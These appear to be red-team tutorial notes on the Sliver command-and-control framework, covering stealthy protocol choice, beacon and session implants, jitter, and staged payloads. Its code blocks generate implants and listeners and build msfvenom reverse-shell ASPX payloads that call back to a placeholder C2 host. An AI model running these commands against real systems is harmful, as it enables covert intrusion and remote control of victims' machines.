# Sliver Communication Protocols
![Architecture](https://github.com/user-attachments/assets/5d6aa18d-6484-42a1-b833-96e29ab9ca9b)
## Choosing the Right Protocol

The selection of a protocol depends on the specific network environment and the attackerâ€™s objectives:

- **Stealth**: DNS and HTTPS are preferred in highly monitored networks.
- **High Bandwidth**: mTLS and HTTPS are better for large data transfers.
- **Internal Pivoting**: Named pipes and TCP pivots are essential for moving laterally within an environment.
- **Bypassing Restrictions**: DNS can bypass most outbound traffic filters.


# Implants 
- Implants are the software (binaries/executables), They offer network connections on different sets of protocols and a means of communication between a C2 server and the target workstation/server.
- Implants can operate in beacon and session modes.
  - **Sessions:** use long-polling connections, which means they use a single TCP connection which is constantly open.
  - **Beacons:** on the other hand call back periodically, and will sleep when not active which can help keep their presence hidden.
```bash
sliver > generate beacon --http 127.0.0.1:8088 -N http_beacon --os linux --skip-symbols
sliver > http --lport 8088
```
## Jitter
- Jitter is a randomization mechanism that alters the interval at which beacon signals are sent to the C2 server.
- Example: If a beacon is set to signal every 60 seconds with a 20% jitter, the actual interval will vary randomly between 48 and 72 seconds.
## Stagers
- **Stegeless:**  one single binary that connects back to u
- **Staged:** Dropper, its a smaller payload that when executed, will call back to the C2 server to download and execute the second stage of the payload in-memory, which is where you actually get the beacon to execute.

```bash
# create profile and set a beacon
sliver > profiles new beacon --http <C2 IP>:8088 --format shellcode profile_name
sliver > http -L <C2 IP> -l 8088
# just another example:  sliver > profiles new beacon --arch amd64 --os windows --mtls <C2 IP>:443 -f shellcode --timeout 300 --seconds 5 --jitter 1 profile_name 


# use sliver shellcode in msvnom stagger
sliver > stage-listener --url tcp://<C2 IP>:4443 --profile profile_name
sliver > generate stager --lhost <C2 IP> --lport 4443 --format csharp --save staged.txt
# change the shellcode in sliver.aspx with the one generated above
msfvenom -p windows/shell/reverse_tcp LHOST=<C2 IP> LPORT=4443 -f aspx > sliver.aspx

# use msvenom stagger directly 
sliver > stage-listener --url http://<C2 IP>:8080 --profile profile_name --prepend-size
msfvenom -p windows/shell/reverse_tcp LHOST=<C2 IP> LPORT=4443 -f aspx > sliver.aspx
```
